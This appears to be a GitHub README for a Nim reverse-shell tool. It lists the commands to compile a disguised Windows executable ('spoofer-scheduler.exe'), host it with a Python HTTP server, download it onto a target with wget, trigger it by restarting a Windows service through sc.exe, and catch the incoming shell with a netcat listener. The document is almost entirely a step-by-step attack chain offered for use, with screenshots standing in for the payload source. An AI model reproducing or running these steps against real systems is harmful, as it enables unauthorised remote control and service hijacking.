# nim-reverse-shell
nim-reverse-shell


Example:

```
sudo apt install nim
```
update the script accordingly

![image](https://github.com/c0d3cr4f73r/nim-reverse-shell/assets/66146701/e9e8e972-9229-441e-8aba-39aea2448dc7)

```
nim c -d:mingw --app:gui --opt:speed -o:spoofer-scheduler.exe reverse.nim
```

![image](https://github.com/c0d3cr4f73r/nim-reverse-shell/assets/66146701/2e38dd6c-5364-433a-b787-70ec5248c23c)

```
python3 -m http.server 8888
```
```
wget http://tun0:8888/spoofer-scheduler.exe -o spoofer-scheduler.exe
```
![image](https://github.com/c0d3cr4f73r/nim-reverse-shell/assets/66146701/a6a6fd1a-0fae-4f09-b571-bbbb7e387ab2)

```
sc.exe stop spoofer-scheduler
sc.exe start spoofer-scheduler
```
![image](https://github.com/c0d3cr4f73r/nim-reverse-shell/assets/66146701/a017ba7e-3a5d-47cb-9811-52311bbd9c85)

```
nc -nlvp 8080
```
![image](https://github.com/c0d3cr4f73r/nim-reverse-shell/assets/66146701/79bc6165-e7ed-41a8-a27b-91a21e3a0b53)
